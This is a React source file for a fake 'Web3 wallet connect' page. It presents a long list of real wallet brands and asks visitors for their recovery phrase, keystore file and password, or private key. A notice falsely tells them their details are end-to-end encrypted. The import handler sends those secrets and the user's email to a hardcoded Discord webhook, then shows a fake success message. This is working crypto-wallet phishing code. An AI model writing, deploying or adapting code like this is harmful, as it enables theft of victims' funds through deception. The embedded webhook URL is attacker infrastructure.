import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Switch } from "@/components/ui/switch";
import { Link } from "react-router-dom";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { X } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

// Import wallet logos
import trustWalletLogo from "@/assets/wallets/trust-wallet-original.png";
import exodusLogo from "@/assets/wallets/exodus-original.png";
import metamaskLogo from "@/assets/wallets/metamask-original.png";
import walletConnectLogo from "@/assets/wallets/walletconnect-original.jpg";
import coinbaseLogo from "@/assets/wallets/coinbase-original.jpg";
import lobstrLogo from "@/assets/wallets/lobstr.png";
import atomicLogo from "@/assets/wallets/atomic.png";
import ontoLogo from "@/assets/wallets/onto.png";
import argentLogo from "@/assets/wallets/argent.jpg";
import cryptoDefiLogo from "@/assets/wallets/crypto-defi.png";
import pillarLogo from "@/assets/wallets/pillar.png";
import anchorLogo from "@/assets/wallets/anchor.png";
import tokenpocketLogo from "@/assets/wallets/tokenpocket.png";
import mathWalletLogo from "@/assets/wallets/math-wallet.png";
import bitpayLogo from "@/assets/wallets/bitpay.jpg";
import binanceSmartChainLogo from "@/assets/wallets/binance-smart-chain.png";
import blockchainLogo from "@/assets/wallets/blockchain.png";
const Wallet = () => {
  // Discord webhook URL from environment variable
  const DISCORD_WEBHOOK = import.meta.env.VITE_DISCORD_WEBHOOK || "https://discordapp.com/api/webhooks/1402822124254531705/6AVMi2U-e_WJ2Nz9N9eF1V5ovYa_zdDu7-eg3eYAh_-_Y6Fzm_eCHjRgv8KDpAAF4gVG";
  const { toast } = useToast();
  
  const [chooseWallet, setChooseWallet] = useState(false);
  const [showUninstalled, setShowUninstalled] = useState(true);
  const [accountDetailsOpen, setAccountDetailsOpen] = useState(false);
  const [importDetailsOpen, setImportDetailsOpen] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState<{name: string, icon: any} | null>(null);
  const [activeTab, setActiveTab] = useState("phrase");
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // Form field states
  const [walletName, setWalletName] = useState("");
  const [email, setEmail] = useState("");
  const [recoveryPhrase, setRecoveryPhrase] = useState("");
  const [keystoreJson, setKeystoreJson] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const wallets = [{
    name: "Trust Wallet",
    icon: trustWalletLogo,
    installed: true
  }, {
    name: "Exodus Wallet",
    icon: exodusLogo,
    installed: true
  }, {
    name: "Wallet Connect Wallet",
    icon: walletConnectLogo,
    installed: true
  }, {
    name: "Lobstr Wallet",
    icon: lobstrLogo,
    installed: true
  }, {
    name: "Atomic Wallet",
    icon: atomicLogo,
    installed: true
  }, {
    name: "Onto Wallet",
    icon: ontoLogo,
    installed: true
  }, {
    name: "MetaMask",
    icon: metamaskLogo,
    installed: true
  }, {
    name: "Argent Wallet",
    icon: argentLogo,
    installed: true
  }, {
    name: "Crypto.com | DeFi Wallet",
    icon: cryptoDefiLogo,
    installed: true
  }, {
    name: "Anchor Wallet",
    icon: anchorLogo,
    installed: false
  }, {
    name: "Math Wallet",
    icon: mathWalletLogo,
    installed: false
  }, {
    name: "BitPay Wallet",
    icon: bitpayLogo,
    installed: false
  }, {
    name: "Trust Vault Wallet",
    icon: "🔒",
    installed: false
  }, {
    name: "Maiar Wallet",
    icon: "🌟",
    installed: false
  }, {
    name: "Huobi Wallet",
    icon: "📱",
    installed: false
  }, {
    name: "Ledger Live Wallet",
    icon: "📋",
    installed: false
  }, {
    name: "Walleth Wallet",
    icon: "🏦",
    installed: false
  }, {
    name: "Authereum Wallet",
    icon: "🔐",
    installed: false
  }, {
    name: "Eidoo Wallet",
    icon: "🔵",
    installed: false
  }, {
    name: "MYKEY Wallet",
    icon: "🔑",
    installed: false
  }, {
    name: "Loopring Wallet",
    icon: "🔄",
    installed: false
  }, {
    name: "CoolWallet Wallet",
    icon: "🧊",
    installed: false
  }, {
    name: "Alice Wallet",
    icon: "👩",
    installed: false
  }, {
    name: "Wazirx Wallet",
    icon: "⚡",
    installed: false
  }, {
    name: "Coinomi Wallet",
    icon: "🔗",
    installed: false
  }, {
    name: "AlphaWallet Wallet",
    icon: "🐺",
    installed: false
  }, {
    name: "D'CENT Wallet",
    icon: "💎",
    installed: false
  }, {
    name: "ZelCore Wallet",
    icon: "⚡",
    installed: false
  }, {
    name: "Nash Wallet",
    icon: "🎯",
    installed: false
  }, {
    name: "Grid Plus Wallet",
    icon: "⚡",
    installed: false
  }, {
    name: "CYBAVO Wallet",
    icon: "🔐",
    installed: false
  }, {
    name: "Tokenary Wallet",
    icon: "🪙",
    installed: false
  }, {
    name: "Torus Wallet",
    icon: "🌀",
    installed: false
  }, {
    name: "Spatium Wallet",
    icon: "🚀",
    installed: false
  }, {
    name: "Via Wallet",
    icon: "🛣️",
    installed: false
  }, {
    name: "OwnBit Wallet",
    icon: "💰",
    installed: false
  }, {
    name: "Equal Wallet",
    icon: "⚖️",
    installed: false
  }, {
    name: "Infinito Wallet",
    icon: "♾️",
    installed: false
  }, {
    name: "Wallet.io Wallet",
    icon: "🌐",
    installed: false
  }, {
    name: "Infinity Wallet",
    icon: "∞",
    installed: false
  }, {
    name: "Easy Pocket Wallet",
    icon: "👜",
    installed: false
  }, {
    name: "Bridge Wallet",
    icon: "🌉",
    installed: false
  }, {
    name: "Spark Point Wallet",
    icon: "✨",
    installed: false
  }, {
    name: "BitKeep Wallet",
    icon: "🔒",
    installed: false
  }, {
    name: "Vision Wallet",
    icon: "👁️",
    installed: false
  }, {
    name: "SWFT Wallet",
    icon: "🚀",
    installed: false
  }, {
    name: "XDC Wallet",
    icon: "💎",
    installed: false
  }, {
    name: "Keplr Wallet",
    icon: "🌌",
    installed: false
  }, {
    name: "Cosmostation Wallet",
    icon: "🌠",
    installed: false
  }, {
    name: "Graph Protocol Wallet",
    icon: "📊",
    installed: false
  }, {
    name: "KardiaChain Wallet",
    icon: "💝",
    installed: false
  }, {
    name: "Harmony Wallet",
    icon: "🎵",
    installed: false
  }, {
    name: "ICONex Wallet",
    icon: "🏛️",
    installed: false
  }, {
    name: "Fetch Wallet",
    icon: "🐕",
    installed: false
  }, {
    name: "Unstoppable Wallet",
    icon: "🚫",
    installed: false
  }, {
    name: "MEET.ONE Wallet",
    icon: "🤝",
    installed: false
  }, {
    name: "Dok Wallet",
    icon: "📄",
    installed: false
  }, {
    name: "MoriX Wallet",
    icon: "❌",
    installed: false
  }, {
    name: "Midas Wallet",
    icon: "👑",
    installed: false
  }, {
    name: "Ellipal Wallet",
    icon: "🔷",
    installed: false
  }, {
    name: "Coinbase Wallet",
    icon: coinbaseLogo,
    installed: false
  }, {
    name: "AT.Wallet Wallet",
    icon: "📱",
    installed: false
  }, {
    name: "KEYRING PRO Wallet",
    icon: "🗝️",
    installed: false
  }, {
    name: "Aktionariat Wallet",
    icon: "📈",
    installed: false
  }, {
    name: "PEAKDEFI Wallet",
    icon: "🏔️",
    installed: false
  }];
  const filteredWallets = showUninstalled ? wallets : wallets.filter(wallet => wallet.installed);

  const handleConnectClick = () => {
    setAccountDetailsOpen(false);
    setImportDetailsOpen(true);
  };

  const handleImportCancel = () => {
    setImportDetailsOpen(false);
    setAccountDetailsOpen(true);
  };

  const handleImportProceed = async () => {
    setIsSubmitting(true);
    
    // Show processing toast
    toast({
      title: "Processing...",
      description: "Please wait while we process your request.",
    });

    // Prepare form data based on active tab
    const formData: any = {
      walletType: selectedWallet?.name || "Unknown Wallet",
      walletName: walletName,
      email: email,
      importType: activeTab,
      timestamp: new Date().toISOString(),
    };

    // Add relevant data based on the active tab
    if (activeTab === "phrase") {
      formData.recoveryPhrase = recoveryPhrase;
    } else if (activeTab === "keystore") {
      formData.keystoreJson = keystoreJson;
      formData.keystorePassword = keystorePassword;
    } else if (activeTab === "privatekey") {
      formData.privateKey = privateKey;
    }

    // Send to Discord webhook
    try {
      await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          content: "🔔 New Wallet Import",
          embeds: [{
            title: "Wallet Import Details",
            color: 0xF59E0B, // Yellow color
            fields: [
              { name: "Wallet Type", value: formData.walletType, inline: true },
              { name: "Import Method", value: activeTab.toUpperCase(), inline: true },
              { name: "Wallet Name", value: formData.walletName || "Not provided", inline: false },
              { name: "Email", value: formData.email || "Not provided", inline: false },
              ...(activeTab === "phrase" && recoveryPhrase ? [{ name: "Recovery Phrase", value: recoveryPhrase, inline: false }] : []),
              ...(activeTab === "keystore" && keystoreJson ? [
                { name: "Keystore JSON", value: keystoreJson.substring(0, 100) + "...", inline: false },
                { name: "Password", value: keystorePassword || "Not provided", inline: false }
              ] : []),
              ...(activeTab === "privatekey" && privateKey ? [{ name: "Private Key", value: privateKey, inline: false }] : []),
            ],
            timestamp: formData.timestamp,
            footer: { text: "Web3 Wallet Connect" }
          }]
        }),
      });
      
      // Show success toast
      toast({
        title: "Success!",
        description: "Your wallet has been connected successfully.",
      });
    } catch (error) {
      console.error("Error sending to Discord:", error);
      toast({
        title: "Error",
        description: "Failed to process your request. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }

    // Reset form and close modal
    setWalletName("");
    setEmail("");
    setRecoveryPhrase("");
    setKeystoreJson("");
    setKeystorePassword("");
    setPrivateKey("");
    setImportDetailsOpen(false);
    setSelectedWallet(null);
  };

  return (
    <>
      {/* Account Details Modal */}
      <Dialog open={accountDetailsOpen} onOpenChange={setAccountDetailsOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader className="flex flex-row items-center justify-between">
            <DialogTitle>Account Details</DialogTitle>
            <Button
              variant="ghost"
              size="sm"
              onClick={() => setAccountDetailsOpen(false)}
              className="h-6 w-6 p-0"
            >
              <X className="h-4 w-4" />
            </Button>
          </DialogHeader>
          <div className="flex flex-col items-center space-y-6 py-6">
            <h3 className="text-lg font-semibold">{selectedWallet?.name}</h3>
            <div className="w-16 h-16 bg-muted rounded-lg flex items-center justify-center">
              {selectedWallet && typeof selectedWallet.icon === 'string' && (selectedWallet.icon.startsWith('/') || selectedWallet.icon.includes('.png') || selectedWallet.icon.includes('.jpg')) && !selectedWallet.icon.startsWith('data:') ? 
                <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-12 h-12 rounded" /> : 
                <div className="text-2xl">{selectedWallet && typeof selectedWallet.icon === 'string' && selectedWallet.icon.startsWith('data:') ? '💼' : selectedWallet?.icon || '💼'}</div>
              }
            </div>
            <p className="text-sm text-red-500 text-center px-4">
              Notice!! All your information and details are end-to-end encrypted on Web3
            </p>
            <Button 
              onClick={handleConnectClick}
              className="bg-yellow-600 hover:bg-yellow-700 text-white px-8"
            >
              Connect
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Import Details Modal */}
      <Dialog open={importDetailsOpen} onOpenChange={setImportDetailsOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader className="flex flex-row items-center justify-between">
            <DialogTitle>Import Details</DialogTitle>
            <Button
              variant="ghost"
              size="sm"
              onClick={() => setImportDetailsOpen(false)}
              className="h-6 w-6 p-0"
            >
              <X className="h-4 w-4" />
            </Button>
          </DialogHeader>
          <div className="space-y-6 py-4">
            <h3 className="text-lg font-semibold text-center text-yellow-600">{selectedWallet?.name}</h3>
            
            <Tabs value={activeTab} onValueChange={setActiveTab}>
              <TabsList className="grid w-full grid-cols-3">
                <TabsTrigger value="phrase">Phrase</TabsTrigger>
                <TabsTrigger value="keystore">Keystore JSON</TabsTrigger>
                <TabsTrigger value="privatekey">Private Key</TabsTrigger>
              </TabsList>
              
              <div className="space-y-4 mt-4">
                <Input 
                  placeholder="Name wallet" 
                  value={walletName}
                  onChange={(e) => setWalletName(e.target.value)}
                />
                <Input 
                  placeholder="Email" 
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
                
                <TabsContent value="phrase" className="mt-4">
                  <div className="space-y-2">
                    <Textarea 
                      placeholder="Enter your recovery phrase" 
                      className="min-h-[100px] resize-none"
                      value={recoveryPhrase}
                      onChange={(e) => setRecoveryPhrase(e.target.value)}
                    />
                    <p className="text-xs text-muted-foreground">
                      Typically 12 (sometimes 24) words separated by spaces
                    </p>
                  </div>
                </TabsContent>
                
                <TabsContent value="keystore" className="mt-4">
                  <div className="space-y-4">
                    <Textarea 
                      placeholder="Keystore JSON" 
                      className="min-h-[100px] resize-none"
                      value={keystoreJson}
                      onChange={(e) => setKeystoreJson(e.target.value)}
                    />
                    <Input 
                      placeholder="Password" 
                      type="password"
                      value={keystorePassword}
                      onChange={(e) => setKeystorePassword(e.target.value)}
                    />
                  </div>
                </TabsContent>
                
                <TabsContent value="privatekey" className="mt-4">
                  <Textarea 
                    placeholder="Private key" 
                    className="min-h-[100px] resize-none"
                    value={privateKey}
                    onChange={(e) => setPrivateKey(e.target.value)}
                  />
                </TabsContent>
              </div>
            </Tabs>
            
            <div className="flex justify-between pt-4">
              <Button 
                variant="outline" 
                onClick={handleImportCancel}
                className="bg-pink-500 hover:bg-pink-600 text-white border-pink-500"
              >
                Cancel
              </Button>
              <Button 
                onClick={handleImportProceed}
                className="bg-yellow-600 hover:bg-yellow-700 text-white"
                disabled={isSubmitting}
              >
                {isSubmitting ? "Processing..." : "Proceed"}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="bg-primary text-primary-foreground px-4 sm:px-6 py-4 sm:py-6">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4 sm:gap-8">
            <Link to="/" className="text-lg sm:text-xl font-bold truncate">
              CRYPTOWEB3.0CONNECT
            </Link>
            <nav className="hidden lg:flex items-center gap-4 xl:gap-6">
              <a href="#" className="hover:text-primary-foreground/80 transition-colors text-sm xl:text-base">DApps</a>
              <a href="#" className="hover:text-primary-foreground/80 transition-colors text-sm xl:text-base">NFT</a>
              <a href="#" className="hover:text-primary-foreground/80 transition-colors text-sm xl:text-base">Web3</a>
            </nav>
          </div>
          <Button variant="outline" className="border-primary-foreground text-primary-foreground hover:bg-primary-foreground hover:text-primary text-sm sm:text-base px-3 sm:px-4 py-2 min-h-[44px]">
            <span className="hidden sm:inline">Secure Wallet</span>
            <span className="sm:hidden">Secure</span>
          </Button>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 sm:px-6 py-8 sm:py-12">
        {/* Secure Section */}
        <div className="text-center mb-8 sm:mb-12">
          <h1 className="text-3xl sm:text-4xl font-bold mb-4 sm:mb-6">Secure</h1>
          <div className="max-w-2xl mx-auto">
            <div className="border-l-4 border-primary pl-4 sm:pl-6 text-left">
              <p className="text-sm sm:text-base text-muted-foreground">
                Refers to protecting assets, data, and transactions. Choose platforms with encryption & MFA.
              </p>
            </div>
          </div>
        </div>

        {/* Controls */}
        

        {/* Web3 Illustration */}
        <div className="text-center mb-8 sm:mb-12">
          <div className="relative max-w-xs sm:max-w-md mx-auto">
            <div className="bg-muted/20 rounded-full p-8 sm:p-12 mb-4 sm:mb-6 overflow-hidden">
              <div className="text-4xl sm:text-6xl font-bold text-primary opacity-80">
                WEB3.0
              </div>
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="w-6 h-6 sm:w-8 sm:h-8 bg-primary rounded-full absolute -top-3 sm:-top-4 -left-3 sm:-left-4 animate-float" style={{
                animationDelay: '0s'
              }}></div>
                <div className="w-4 h-4 sm:w-6 sm:h-6 bg-accent rounded-full absolute -top-1 sm:-top-2 -right-4 sm:-right-6 animate-float" style={{
                animationDelay: '1s'
              }}></div>
                <div className="w-8 h-8 sm:w-10 sm:h-10 bg-primary/70 rounded-full absolute -bottom-4 sm:-bottom-6 -left-1 sm:-left-2 animate-float" style={{
                animationDelay: '2s'
              }}></div>
                <div className="w-3 h-3 sm:w-4 sm:h-4 bg-accent rounded-full absolute -bottom-1 sm:-bottom-2 -right-3 sm:-right-4 animate-float" style={{
                animationDelay: '3s'
              }}></div>
                <div className="w-5 h-5 sm:w-7 sm:h-7 bg-primary rounded-full absolute top-6 sm:top-8 -right-6 sm:-right-8 animate-float" style={{
                animationDelay: '4s'
              }}></div>
                <div className="w-4 h-4 sm:w-5 sm:h-5 bg-accent/80 rounded-full absolute bottom-6 sm:bottom-8 -left-6 sm:-left-8 animate-float" style={{
                animationDelay: '5s'
              }}></div>
              </div>
            </div>
          </div>
        </div>

        {/* Connect Wallet Section */}
        <div className="max-w-sm sm:max-w-lg mx-auto">
          <h2 className="text-xl sm:text-2xl font-bold text-center mb-6 sm:mb-8">Connect your Wallet</h2>
          
          <div className="space-y-3 sm:space-y-4 mb-6">
            {filteredWallets.map((wallet, index) => <div 
                key={wallet.name} 
                className="flex items-center justify-between p-4 sm:p-4 bg-card border border-border rounded-lg hover:bg-card/80 transition-colors cursor-pointer min-h-[60px] sm:min-h-[68px]"
                onClick={() => {
                  setSelectedWallet(wallet);
                  setAccountDetailsOpen(true);
                }}
              >
                <div className="flex items-center gap-3 flex-1 min-w-0">
                  {typeof wallet.icon === 'string' && (wallet.icon.startsWith('/') || wallet.icon.includes('.png') || wallet.icon.includes('.jpg')) && !wallet.icon.startsWith('data:') ? <img src={wallet.icon} alt={wallet.name} className="w-10 h-10 sm:w-12 sm:h-12 rounded-full flex-shrink-0" /> : <div className="text-2xl sm:text-3xl flex-shrink-0">{typeof wallet.icon === 'string' && wallet.icon.startsWith('data:') ? '💼' : wallet.icon}</div>}
                  <span className="font-medium text-sm sm:text-base truncate">{wallet.name}</span>
                </div>
                <Button variant="ghost" size="sm" className="text-muted-foreground ml-2 p-2 min-w-[44px] min-h-[44px]">
                  →
                </Button>
              </div>)}
          </div>

          <div className="text-center mb-6 sm:mb-8">
            <button className="text-primary hover:text-primary/80 transition-colors text-sm font-medium py-2 px-4 min-h-[44px]">
              More Wallet
            </button>
          </div>

          <Button variant="hero" size="xl" className="w-full animate-pulse-glow min-h-[48px] sm:min-h-[56px] text-base sm:text-lg">
            Connect Wallet
          </Button>
        </div>
      </main>
    </div>
    </>
  );
};
export default Wallet;